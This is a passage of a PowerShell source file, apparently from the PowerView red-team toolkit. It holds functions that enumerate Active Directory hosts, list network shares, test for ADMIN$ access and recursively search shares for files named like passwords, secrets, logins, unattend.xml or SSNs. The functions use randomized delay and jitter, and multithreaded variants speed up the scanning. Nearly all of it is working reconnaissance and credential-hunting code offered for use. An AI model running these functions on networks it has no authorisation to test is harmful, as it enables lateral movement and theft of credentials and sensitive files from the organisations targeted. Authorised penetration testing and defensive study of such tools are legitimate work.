        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            if ($server -ne ''){
                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                # get the shares for this host and display what we find
                $shares = Get-NetShare -HostName $server
                foreach ($share in $shares) {
                    Write-Debug "[*] Server share: $share"
                    $netname = $share.shi1_netname
                    $remark = $share.shi1_remark
                    $path = '\\'+$server+'\'+$netname

                    # make sure we get a real share name back
                    if (($netname) -and ($netname.trim() -ne '')){

                        # if we're just checking for access to ADMIN$
                        if($CheckAdmin){
                            if($netname.ToUpper() -eq "ADMIN$"){
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                        }

                        # skip this share if it's in the exclude list
                        elseif ($excludedShares -notcontains $netname.ToUpper()){
                            # see if we want to check access to this share
                            if($CheckShareAccess){
                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                            else{
                                "\\$server\$netname `t- $remark"
                            }
                        }
                    }
                }
            }
        }
    }
}


function Invoke-ShareFinderThreaded {
    <#
        .SYNOPSIS
        Finds (non-standard) shares on machines in the domain.
        Threaded version of Invoke-ShareFinder. Uses multithreading 
        to speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it lists of active shares with Get-NetShare. Non-standard shares
        can be filtered out with -Exclude* flags.
        Threaded version of Invoke-ShareFinder.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludedShares
        Shares to exclude from output, wildcards accepted (i.e. IPC*)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER CheckAdmin
        Only display ADMIN$ shares the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-ShareFinder
        Find shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -ExcludedShares IPC$,PRINT$
        Find shares on the domain excluding IPC$ and PRINT$

        .EXAMPLE
        > Invoke-ShareFinder -HostList hosts.txt
        Find shares for machines in the specified hostlist.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [string[]]
        $ExcludedShares,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $NoPing,

        [String]
        $Domain,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        $currentUser = ([Environment]::UserName).toLower()

        Write-Verbose "[*] Running Invoke-ShareFinderThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $CheckShareAccess, $ExcludedShares, $CheckAdmin)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # get the shares for this host and check what we find
                $shares = Get-NetShare -HostName $Server
                foreach ($share in $shares) {
                    Write-Debug "[*] Server share: $share"
                    $netname = $share.shi1_netname
                    $remark = $share.shi1_remark
                    $path = '\\'+$server+'\'+$netname

                    # make sure we get a real share name back
                    if (($netname) -and ($netname.trim() -ne '')){
                        # if we're just checking for access to ADMIN$
                        if($CheckAdmin){
                            if($netname.ToUpper() -eq "ADMIN$"){
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                        }
                        # skip this share if it's in the exclude list
                        elseif ($excludedShares -notcontains $netname.ToUpper()){
                            # see if we want to check access to this share
                            if($CheckShareAccess){
                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    "\\$server\$netname `t- $remark"
                                }
                                catch {}
                            }
                            else{
                                "\\$server\$netname `t- $remark"
                            }
                        }
                    }
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server $($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CheckShareAccess', $CheckShareAccess).AddParameter('ExcludedShares', $ExcludedShares)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


function Invoke-FileFinder {
    <#
        .SYNOPSIS
        Finds sensitive files on the domain.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ShareList
        List if \\HOST\shares to search through.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER IncludeC
        Include any C$ shares in recursive searching (default ignore).

        .PARAMETER IncludeAdmin
        Include any ADMIN$ shares in recursive searching (default ignore).

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FileFinder
        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinder -Domain testing
        Find readable files on the 'testing' domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinder -IncludeC
        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login' or 'unattend*.xml' in the name,
        including C$ shares.

        .EXAMPLE
        > Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn -OutFile out.csv
        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name, and write everything to "out.csv"

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,

        [string[]]
        $Terms,

        [String]
        $TermList,

        [String]
        $AccessDateLimit = '1/1/1970',

        [String]
        $WriteDateLimit = '1/1/1970',

        [String]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # figure out the shares we want to ignore
        [String[]] $excludedShares = @("C$", "ADMIN$")

        # random object for delay
        $randNo = New-Object System.Random

        # see if we're specifically including any of the normally excluded sets
        if ($IncludeC){
            if ($IncludeAdmin){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("ADMIN$")
            }
        }

        if ($IncludeAdmin){
            if ($IncludeC){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("C$")
            }
        }

        # delete any existing output file if it already exists
        If ($OutFile -and (Test-Path -Path $OutFile)){ Remove-Item -Path $OutFile }

        # if there's a set of terms specified to search for
        if ($TermList){
            if (Test-Path -Path $TermList){
                foreach ($Term in Get-Content -Path $TermList) {
                    if (($Term -ne $null) -and ($Term.trim() -ne '')){
                        $Terms += $Term
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$TermList' doesn't exist!"
                return $null
            }
        }

        # if we are passed a share list, enumerate each with appropriate options, then return
        if($ShareList){
            if (Test-Path -Path $ShareList){
                foreach ($Item in Get-Content -Path $ShareList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){

                        # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                        $share = $Item.Split("`t")[0]

                        # get just the share name from the full path
                        $shareName = $share.split('\')[3]

                        $cmd = "Invoke-FileSearch -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"

                        Write-Verbose "[*] Enumerating share $share"
                        Invoke-Expression $cmd
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$ShareList' doesn't exist!"
                return $null
            }
            return
        }
        else{
            # if we aren't using a share list, first get the target domain
            if($Domain){
                $targetDomain = $Domain
            }
            else{
                # use the local domain
                $targetDomain = $null
            }

            Write-Verbose "[*] Running Invoke-FileFinder with delay of $Delay"
            if($targetDomain){
                Write-Verbose "[*] Domain: $targetDomain"
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($HostList){
                if (Test-Path -Path $HostList){
                    $Hosts = Get-Content -Path $HostList
                }
                else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                    "[!] Input file '$HostList' doesn't exist!"
                    return
                }
            }
            elseif($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
            }
        }
    }

    process {

        if(-not $ShareList){
            if ( ((-not ($Hosts)) -or ($Hosts.length -eq 0)) -and (-not $ShareList) ) {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                $Hosts = Get-NetComputer -Domain $targetDomain
            }

            # randomize the server list
            $Hosts = Get-ShuffledArray $Hosts

            if(-not $NoPing){
                $Hosts = $Hosts | Invoke-Ping
            }

            # return/output the current status lines
            $counter = 0

            foreach ($server in $Hosts){

                $counter = $counter + 1

                Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

                if ($server -and ($server -ne '')){
                    # sleep for our semi-randomized interval
                    Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = '\\'+$server+'\'+$netname

                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne '')){

                            # skip this share if it's in the exclude list
                            if ($excludedShares -notcontains $netname.ToUpper()){

                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)

                                    $cmd = "Invoke-FileSearch -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"

                                    Write-Verbose "[*] Enumerating share $path"

                                    Invoke-Expression $cmd
                                }
                                catch {}

                            }
                        }
                    }
                }
            }
        }
    }
}


function Invoke-FileFinderThreaded {
    <#
        .SYNOPSIS
        Finds sensitive files on the domain. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.
        Threaded version of Invoke-FileFinder

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ShareList
        List if \\HOST\shares to search through.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER IncludeC
        Include any C$ shares in recursive searching (default ignore).

        .PARAMETER IncludeAdmin
        Include any ADMIN$ shares in recursive searching (default ignore).

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FileFinderThreaded
        Find readable files on the domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinder -Domain testing
        Find readable files on the 'testing' domain with 'pass', 'sensitive',
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,

        .EXAMPLE
        > Invoke-FileFinderThreaded -ShareList shares.txt -Terms accounts,ssn
        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $ShareList,

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,

        [string[]]
        $Terms,

        [String]
        $TermList,

        [String]
        $AccessDateLimit = '1/1/1970',

        [String]
        $WriteDateLimit = '1/1/1970',

        [String]
        $CreateDateLimit = '1/1/1970',

        [Switch]
        $IncludeC,

        [Switch]
        $IncludeAdmin,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Switch]
        $NoPing,

        [String]
        $Domain,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # figure out the shares we want to ignore
        [String[]] $excludedShares = @("C$", "ADMIN$")

        # see if we're specifically including any of the normally excluded sets
        if ($IncludeC){
            if ($IncludeAdmin){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("ADMIN$")
            }
        }
        if ($IncludeAdmin){
            if ($IncludeC){
                $excludedShares = @()
            }
            else{
                $excludedShares = @("C$")
            }
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-FileFinderThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        $shares = @()
        $servers = @()

        # if there's a set of terms specified to search for
        if ($TermList){
            if (Test-Path -Path $TermList){
                foreach ($Term in Get-Content -Path $TermList) {
                    if (($Term -ne $null) -and ($Term.trim() -ne '')){
                        $Terms += $Term
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$TermList' doesn't exist!"
                return $null
            }
        }

        # if we're hard-passed a set of shares
        if($ShareList){
            if (Test-Path -Path $ShareList){
                foreach ($Item in Get-Content -Path $ShareList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){
                        # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                        $share = $Item.Split("`t")[0]
                        $shares += $share
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$ShareList' doesn't exist!"
                return $null
            }
        }
        else{
            # otherwise if we're using a host list, read the targets in and add them to the target list
            if($HostList){
                if (Test-Path -Path $HostList){
                    $Hosts = Get-Content -Path $HostList
                }
                else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                    "[!] Input file '$HostList' doesn't exist!"
                    return
                }
            }
            elseif($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
            }
        }

        # script blocks that eunmerates share or a server
        # these are called by the multi-threading code later
        $EnumShareBlock = {
            param($Share, $Terms, $ExcludeFolders, $ExcludeHidden, $FreshEXES, $OfficeDocs, $CheckWriteAccess)

            $cmd = "Invoke-FileSearch -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"})"

            Write-Verbose "[*] Enumerating share $share"
            Invoke-Expression $cmd
        }
        $EnumServerBlock = {
            param($Server, $Ping, $excludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXES, $CheckWriteAccess)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){

                # get the shares for this host and display what we find
                $shares = Get-NetShare -HostName $server
                foreach ($share in $shares) {

                    $netname = $share.shi1_netname
                    $remark = $share.shi1_remark
                    $path = '\\'+$server+'\'+$netname

                    # make sure we get a real share name back
                    if (($netname) -and ($netname.trim() -ne '')){

                        # skip this share if it's in the exclude list
                        if ($excludedShares -notcontains $netname.ToUpper()){
                            # check if the user has access to this path
                            try{
                                $f=[IO.Directory]::GetFiles($path)

                                $cmd = "Invoke-FileSearch -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"})"
                                Invoke-Expression $cmd
                            }
                            catch {
                                Write-Debug "[!] No access to $path"
                            }
                        }
                    }
                }

            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()
        $jobs = @()
        $ps = @()
        $wait = @()
    }

    process {

        # different script blocks to thread depending on what's passed
        if ($ShareList){
            foreach ($share in $shares){
                # make sure we get a share name
                if ($share -ne ''){
                    Write-Verbose "[*] Enumerating share $share ($($counter+1) of $($shares.count))"

                    While ($($pool.GetAvailableRunspaces()) -le 0) {
                        Start-Sleep -milliseconds 500
                    }

                    # create a "powershell pipeline runner"
                    $ps += [powershell]::create()

                    $ps[$counter].runspacepool = $pool

                    # add the server script block + arguments
                    [void]$ps[$counter].AddScript($EnumShareBlock).AddParameter('Share', $Share).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $ExcludeFolders).AddParameter('ExcludeHidden', $ExcludeHidden).AddParameter('FreshEXES', $FreshEXES).AddParameter('OfficeDocs', $OfficeDocs).AddParameter('CheckWriteAccess', $CheckWriteAccess).AddParameter('OutFile', $OutFile)

                    # start job
                    $jobs += $ps[$counter].BeginInvoke();

                    # store wait handles for WaitForAll call
                    $wait += $jobs[$counter].AsyncWaitHandle
                }
                $counter = $counter + 1
            }
        }
        else{
            if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                $Hosts = Get-NetComputer -Domain $targetDomain
            }

            # randomize the host list
            $Hosts = Get-ShuffledArray $Hosts

            foreach ($server in $Hosts){
                # make sure we get a server name
                if ($server -ne ''){
                    Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                    While ($($pool.GetAvailableRunspaces()) -le 0) {
                        Start-Sleep -milliseconds 500
                    }

                    # create a "powershell pipeline runner"
                    $ps += [powershell]::create()

                    $ps[$counter].runspacepool = $pool

                    # add the server script block + arguments
                   [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('excludedShares', $excludedShares).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $ExcludeFolders).AddParameter('OfficeDocs', $OfficeDocs).AddParameter('ExcludeHidden', $ExcludeHidden).AddParameter('FreshEXES', $FreshEXES).AddParameter('CheckWriteAccess', $CheckWriteAccess).AddParameter('OutFile', $OutFile)

                    # start job
                    $jobs += $ps[$counter].BeginInvoke();

                    # store wait handles for WaitForAll call
                    $wait += $jobs[$counter].AsyncWaitHandle
                }
                $counter = $counter + 1
            }
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Find-LocalAdminAccess {
    <#
        .SYNOPSIS
        Finds machines on the local domain where the current user has
        local administrator access.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Find-LocalAdminAccess
        Find machines on the local domain where the current user has local
        administrator access.

        .EXAMPLE
        > Find-LocalAdminAccess -Domain testing
        Find machines on the 'testing' domain where the current user has
        local administrator access.

        .EXAMPLE
        > Find-LocalAdminAccess -Delay 60
        Find machines on the local domain where the current user has local administrator
        access with a 60 second (+/- *.3) randomized delay between touching each host.

        .EXAMPLE
        > Find-LocalAdminAccess -HostList hosts.txt
        Find which machines in the host list the current user has local
        administrator access.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
